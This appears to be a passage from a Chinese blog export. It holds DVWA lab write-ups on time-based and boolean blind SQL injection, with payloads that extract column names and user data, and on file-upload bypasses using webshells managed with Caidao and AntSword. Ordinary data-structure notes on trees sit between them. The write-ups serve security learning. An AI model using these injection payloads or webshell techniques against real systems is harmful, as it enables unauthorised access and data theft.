<h3 id="字段长"><a href="#字段长" class="headerlink" title="字段长"></a>字段长</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(length(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=’users’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br></pre></td></tr></table></figure>
<h3 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=’users’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br></pre></td></tr></table></figure>
<h3 id="字段值"><a href="#字段值" class="headerlink" title="字段值"></a>字段值</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">查询<span class="keyword">user</span>字段的数据</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> count(*) <span class="keyword">from</span> users)=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br><span class="line">查询第一个数据的长度</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(length(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br><span class="line">爆出第一个数据值</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br></pre></td></tr></table></figure>
<p>可以看到时间盲注相比于布尔盲注只是多了一个if函数来执行sleep函数代替回显。</p>
]]></content>
      <categories>
        <category>web攻防</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞和中国剑蚁、菜刀的使用</title>
    <url>/2022/08/19/uploadfile/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本来是想起来原来写题的时候因为连不上剑蚁差点原地升天，后来在学习小马的时候就改用菜刀，顺带连了一下剑蚁结果可以了，都到这了顺带就给dvwa的文件上传部分通关了，本篇是靶场通关和工具使用记录，文件上传漏洞具体学习在码了，剑蚁和菜刀可以到下文链接下载</p>
<span id="more"></span>
<p>打开dvwa的文件上传漏洞靶场，上传小马<br><img src="/2022/08/19/uploadfile/image-20220819094509669.png" alt><br>1.php内容为：<br><img src="/2022/08/19/uploadfile/image-20220819094628330.png" alt><br>所以密码是pass</p>
<p>菜刀和剑蚁会有报错提示，可能唰一下就删掉了，推荐安虚拟机上<br>下载地址：<a href="https://github.com/gjy20001003/resourse">loveakali.github.io</a></p>
<h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p><img src="/2022/08/19/uploadfile/image-20220819094852775.png" alt><br>地址要精确到你上传的webshell文件的地址，地址后面是你的密码，语言最好选utf-8吧，不然可能报错。<br><img src="/2022/08/19/uploadfile/image-20220819095015883.png" alt><br>然后点击文件管理就ok了<br><img src="/2022/08/19/uploadfile/image-20220819095043227.png" alt><br><img src="/2022/08/19/uploadfile/image-20220819095100873.png" alt><br>清晰，只能说写菜刀的人真滴nb。</p>
<p>关于菜刀的其他配置<br>如果知道数据库的话还可以把数据库拉过来一起管理，就是在配置那一栏填写如下代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">T</span>&gt;</span>数据库类型<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>主机名称<span class="tag">&lt;/<span class="name">H</span>&gt;</span>		eg：localhost</span><br><span class="line"><span class="tag">&lt;<span class="name">U</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">P</span>&gt;</span>		</span><br></pre></td></tr></table></figure>
<p>密码可以通过sql注入获得，可见<a href="/2022/08/17/sql%E6%B3%A8%E5%85%A5/" title="sql注入">sql注入</a><img src="/2022/08/19/uploadfile/image-20220819100026152.png" alt></p>
<p><img src="/2022/08/19/uploadfile/image-20220819100127232.png" alt><br>注：在配置旁边的输入栏可以自己手写sql语句来执行，要点执行。</p>
<h3 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h3><p>扫一下自己的博客，会返回一个ip地址<br><img src="/2022/08/19/uploadfile/image-20220819101224764.png" alt></p>
<p>爬取一下自己的博客<br><img src="/2022/08/19/uploadfile/image-20220819102045443.png" alt><br>回到菜刀的目录看到了多了一个文件夹叫做loveakali.top<br><img src="/2022/08/19/uploadfile/image-20220819102130301.png" alt><br>可以看到整个网站都被爬下来了，内容也可以显示<br><img src="/2022/08/19/uploadfile/image-20220819102443133.png" alt></p>
<h3 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h3><p>执行cmd命令set，能否得到回显，如果可以证明虚拟终端功能可用<img src="/2022/08/19/uploadfile/image-20220819102723914.png" alt><br>之后只要是在你权限下的命令就都可以执行了，当然也可以通过命令注入等手段提升权限。</p>
<h2 id="剑蚁"><a href="#剑蚁" class="headerlink" title="剑蚁"></a>剑蚁</h2><p><img src="/2022/08/19/uploadfile/image-20220819103011296.png" alt><br>可以看到绝大多数功能和才到差不多，不过多了一个插件市场可以下载自己想要的插件<br>数据操作就是数据库管理<br><img src="/2022/08/19/uploadfile/image-20220819103122128.png" alt></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看源代码发现没有对上传的文件进行任何验证。<br><img src="/2022/08/19/uploadfile/image-20220819133948208.png" alt><br>可以看到成功了，然后用菜刀或者剑蚁都可以看到其他文件</p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>对文件后缀名进行了验证，在if语句中判断上传的文件类型是不是jpg或者png文件和大小是否小于100kb<br>在过程中抓包并修改文件类型，即将Content-Type中application/octet-stream改为image/png或image/igep<br><img src="/2022/08/19/uploadfile/image-20220819134658297.png" alt><br><img src="/2022/08/19/uploadfile/image-20220819134746885.png" alt><br>或者<br><img src="/2022/08/19/uploadfile/image-20220819150331886.png" alt><br><img src="/2022/08/19/uploadfile/image-20220819150402250.png" alt></p>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>源代码中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>( <span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>将输出文件名.后所有信息然后送去if语句验证。同时使用getimagesize()函数限制了上传文件的文件头必须是图像类型。<br>那就先做一个图片马<br><img src="/2022/08/19/uploadfile/image-20220819141118474.png" alt><br>b表示二进制文件，a表示ascll码文件<br>图片马就制作好了，看起来平平无奇谁能想到里面藏着木马呢<br><img src="/2022/08/19/uploadfile/image-20220819141342629.png" style="zoom:50%;"></p>
<p>抓个包看看，在图片的末尾也看到了，可惜菜刀和剑蚁连不上应该是无法解析图片的问题<br><img src="/2022/08/19/uploadfile/image-20220819143008852-16608940380672.png" alt><br>成功上传<br><img src="/2022/08/19/uploadfile/image-20220819142200672-16608940336041.png" alt></p>
<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$target_file</span>   =  <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"><span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br></pre></td></tr></table></figure>
<p>使用md5重命名防止截断跳过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure>
<p>加入Anti-CSRF token防护CSRF攻击</p>
]]></content>
      <categories>
        <category>web攻防</category>
      </categories>
      <tags>
        <tag>文件上传漏洞,工具]</tag>
      </tags>
  </entry>
  <entry>
    <title>树的逻辑结构</title>
    <url>/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>使用双亲表示法孩子表示法以及孩子兄弟表示法表示树的逻辑结构，以及森林和二叉树的转换。</p>
<span id="more"></span>
<h2 id="树的逻辑结构"><a href="#树的逻辑结构" class="headerlink" title="树的逻辑结构"></a>树的逻辑结构</h2><h3 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h3><p><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709211533787.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TREE_SIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> parent;</span><br><span class="line">&#125;PTNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    PTNode nodes[MAX_TREE_SIZE];</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">&#125;PTree;</span><br></pre></td></tr></table></figure>
<h3 id="孩子表示法"><a href="#孩子表示法" class="headerlink" title="孩子表示法"></a>孩子表示法</h3><p><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709212419211.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> child;   <span class="comment">//孩子结点在数组中的位置</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">next</span>;</span>   <span class="comment">//下一个改组</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">fistchild</span>;</span> <span class="comment">//第一个孩子</span></span><br><span class="line">&#125; CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    CTBox nodes[MAX_TREE_SIZE];</span><br><span class="line">    <span class="type">int</span> n,r    <span class="comment">//结点数和根的位置</span></span><br><span class="line">&#125;CTree</span><br></pre></td></tr></table></figure>
<h3 id="孩子兄弟表示法"><a href="#孩子兄弟表示法" class="headerlink" title="孩子兄弟表示法"></a>孩子兄弟表示法</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span>&#123;</span></span><br><span class="line">    ElemType data;   <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span> *<span class="title">firstchild</span>,*<span class="title">nextsibling</span>;</span>  <span class="comment">//第一个孩子和右兄弟指针</span></span><br><span class="line">&#125;CSNode,*CSTree</span><br></pre></td></tr></table></figure>
<h3 id="森林和二叉树的转换"><a href="#森林和二叉树的转换" class="headerlink" title="森林和二叉树的转换"></a>森林和二叉树的转换</h3><p><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709213548106.png" alt><br><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709213700619.png" alt="image-20220709213700619"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>线索二叉树</title>
    <url>/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>构建线索二叉树以及通过先序中序后序遍历查找线索二叉树的前驱后继</p>
<span id="more"></span>
<h2 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h2><p>普通二叉树不能从任意一个指定结点开始遍历<br><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709200423798.png" alt></p>
<h3 id="线索二叉树-1"><a href="#线索二叉树-1" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709200709261.png" alt><br><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709200930693.png" alt></p>
<h3 id="土办法找前驱"><a href="#土办法找前驱" class="headerlink" title="土办法找前驱"></a>土办法找前驱</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//辅助全局变量，用于查找结点p的前驱</span></span><br><span class="line">BiTNode *p;</span><br><span class="line">BiTNode *pre=null;</span><br><span class="line">BiTNode *final-null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InOrder(T-&gt;lchild);</span><br><span class="line">        visit(T);</span><br><span class="line">        InOrder(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问结点q</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">(BiTNode *q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q==p)</span><br><span class="line">        final = pre;     <span class="comment">//找到p的前驱</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        pre = q;       <span class="comment">//pre指向当前访问的结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="中序线索化"><a href="#中序线索化" class="headerlink" title="中序线索化"></a>中序线索化</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量pre，指向当前访问结点的前驱</span></span><br><span class="line">ThreadNode *pre=null;</span><br><span class="line"><span class="comment">//中序线索化二叉树T</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreateInThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line">    pre=null;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InThread(T);</span><br><span class="line">        <span class="keyword">if</span>(pre-&gt;rchild==null)</span><br><span class="line">            pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//线索二叉树的结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;ThreadNode,* ThreadTree;</span><br><span class="line"><span class="comment">//中序遍历二叉树，一边遍历一边线索化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InOrder(T-&gt;lchild);</span><br><span class="line">        visit(T);</span><br><span class="line">        InOrder(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">(ThreadNode *q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;lchild==null)&#123;</span><br><span class="line">        q-&gt;lchild=pre;</span><br><span class="line">        q-&gt;ltag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pre!=null&amp;&amp;pre-&gt;rchild==null)&#123;</span><br><span class="line">        pre-&gt;rchild=q;</span><br><span class="line">        pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pre=q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="先序线索化"><a href="#先序线索化" class="headerlink" title="先序线索化"></a>先序线索化</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709204642583.png" alt></p>
<h2 id="在线索二叉树中找前驱后继"><a href="#在线索二叉树中找前驱后继" class="headerlink" title="在线索二叉树中找前驱后继"></a>在线索二叉树中找前驱后继</h2><h3 id="中序后继"><a href="#中序后继" class="headerlink" title="中序后继"></a>中序后继</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709205639652.png" alt><br>该方法的时间复杂度是O（1)</p>
<h3 id="中序前驱"><a href="#中序前驱" class="headerlink" title="中序前驱"></a>中序前驱</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709205928279.png" alt></p>
<h3 id="先序前驱"><a href="#先序前驱" class="headerlink" title="先序前驱"></a>先序前驱</h3><p>二叉链表没办法找到先序前驱<br>将二叉链表转化为三叉链表<br><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709210518474.png" alt></p>
<h3 id="后序前驱"><a href="#后序前驱" class="headerlink" title="后序前驱"></a>后序前驱</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709211254569.png" alt></p>
<h3 id="后序后继"><a href="#后序后继" class="headerlink" title="后序后继"></a>后序后继</h3><p>p.rtag==0，则一定有右孩子，所以只能用土办法来找</p>
<p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709210913690.png" alt></p>
<p>p为根节点则没有后序后继</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709211007944.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL盲注</title>
    <url>/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>对sql注入类型的判断以及对于盲注的两种方法二分法和爆破法的实现</p>
<span id="more"></span>
<h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>(1)首先判断时字符型还是数字型注入<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151435068.png" alt><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151552860.png" alt></p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">分析：</span><br><span class="line">依次输入</span><br><span class="line"><span class="number">1</span>                    回显：exists</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>            回显：exists</span><br><span class="line"><span class="keyword">and</span>逻辑语句的会先结果都是存在的，没有起到应有的效果，说明不是整型注入，猜测是字符型注入</span><br></pre></td></tr></table></figure>
<p>(2)猜解字符型<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151701973.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151816959.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151840594.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151903942.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151924099.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818160837212.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818160855152.png" alt></p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">分析：</span><br><span class="line">通过上面<span class="number">5</span>个图找到了引号插入点后，依次输入</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>                 回显：missing</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>                  回显：<span class="keyword">exists</span></span><br><span class="line">and和or语句起到了效果，说明是字符型注入</span><br><span class="line">并且经过<span class="meta">#和--的测试，注释符也没有被过滤</span></span><br></pre></td></tr></table></figure>
<h3 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h3><p>(1)数据库名长<br>语法：1’ and length(database())=X#<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152204573.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152252961.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152306683.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152346187.png" alt><br>可以知道数据库名长为4位，然后就是最麻烦的地方猜名字，两种方法ascll二分法和burp爆破</p>
<h4 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h4><p>数字的ascll是从80-89，小写字母是从97-122，大写字母是从65-90</p>
